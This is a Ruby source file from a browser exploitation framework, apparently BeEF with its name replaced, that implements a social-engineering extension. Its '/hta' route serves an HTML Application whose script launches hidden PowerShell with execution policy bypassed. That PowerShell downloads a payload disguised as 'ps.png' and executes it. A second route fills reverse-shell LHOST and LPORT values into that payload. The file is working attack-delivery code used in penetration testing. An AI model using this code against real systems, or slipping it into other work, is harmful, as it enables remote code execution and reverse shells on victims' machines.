#
# Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (Server) - https://serverproject.com
# See the file 'doc/COPYING' for copying permission
#
module Server
  module Extension
    module SocialEngineering
      #
      # By default powershell will be served from http://server_server:server_port/ps/ps.png
      #
      # NOTE: make sure you change the 'server.http.public' settings in the main Server config.yaml to the public IP address / hostname for Server,
      # and also the powershell-related variable in extensions/social_engineering/config.yaml,
      # and also write your PowerShell payload to extensions/social_engineering/powershell/powershell_payload.
      class Bind_powershell < Server::Core::Router::Router
        before do
          headers 'Pragma' => 'no-cache',
                  'Cache-Control' => 'no-cache',
                  'Expires' => '0'
        end

        # serves the HTML Application (HTA)
        get '/hta' do
          response['Content-Type'] = 'application/hta'
          @config = Server::Core::Configuration.instance
          server_url_str = @config.server_url_str
          ps_url = @config.get('server.extension.social_engineering.powershell.powershell_handler_url')
          payload_url = "#{server_url_str}#{ps_url}/ps.png"

          print_info "Serving HTA. Powershell payload will be retrieved from: #{payload_url}"
          "<script>
                var c = \"cmd.exe /c powershell.exe -w hidden -nop -ep bypass -c \\\"\\\"IEX ((new-object net.webclient).downloadstring('#{payload_url}')); Invoke-ps\\\"\\\"\";
                new ActiveXObject('WScript.Shell').Run(c);
            </script>"
        end

        # serves the powershell payload after modifying LHOST/LPORT
        # The payload gets served via HTTP by default. Serving it via HTTPS it's still a TODO
        get '/ps.png' do
          response['Content-Type'] = 'text/plain'

          @ps_lhost = Server::Core::Configuration.instance.get('server.extension.social_engineering.powershell.msf_reverse_handler_host')
          @ps_port = Server::Core::Configuration.instance.get('server.extension.social_engineering.powershell.msf_reverse_handler_port')

          ps_payload_path = "#{$root_dir}/extensions/social_engineering/powershell/powershell_payload"

          if File.exist?(ps_payload_path)
            return File.read(ps_payload_path).to_s.gsub('___LHOST___', @ps_lhost).gsub('___LPORT___', @ps_port)
          end

          nil
        end
      end
    end
  end
end
